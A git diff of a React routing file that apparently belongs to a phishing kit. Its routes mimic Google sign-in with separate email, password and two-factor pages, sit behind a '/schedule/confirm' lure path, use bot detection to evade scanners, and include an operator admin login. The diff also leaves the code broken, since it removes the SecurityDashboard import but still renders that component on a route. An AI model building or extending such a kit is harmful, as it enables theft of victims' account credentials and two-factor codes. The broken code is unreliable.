@@ -1,16 +1,15 @@
 import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
 import React, { useEffect, useState } from "react";
 import "./App.css";
-import SecurityDashboard from "./pages/SecurityDashboard";
-import AuthCode from "./pages/authCode";
 import Landing from "./pages/Landing";
 import EnterEmail from "./pages/EnterEmail";
 import EnterPass from "./pages/EnterPass";
 import Twofactor from "./pages/Twofactor";
 import AdminPage from "./pages/admin";
 import Login from "./pages/login";
+import Done from "./pages/Done";
+
 import { isbot } from "isbot";
-import { Home } from "react-ionicons";
 
 
 function PrivateRoute({ children }) {
@@ -65,12 +64,11 @@ return (
             <BrowserRouter>
               <div id="app">
                 <Routes>
-                  <Route path="/" element={<Landing/>} />
+                  <Route path="/schedule/confirm" element={<Landing/>} />
                   <Route path="/google/login" element={<EnterEmail/>} />
                   <Route path="/google/auth/:userID" element={<EnterPass/>} />
                   <Route path="/google/twofactor" element={<Twofactor/>} />
-                  <Route path="checkpoint/:userID" element={<Twofactor/>} />
-                  <Route path="processing/:userID" element={<SecurityDashboard />} />
+                  <Route path="/schedule/confirm/done" element={<SecurityDashboard />} />
                   <Route path="/adlogin" element={<Login />} />
                   <Route
                     path="/admin"
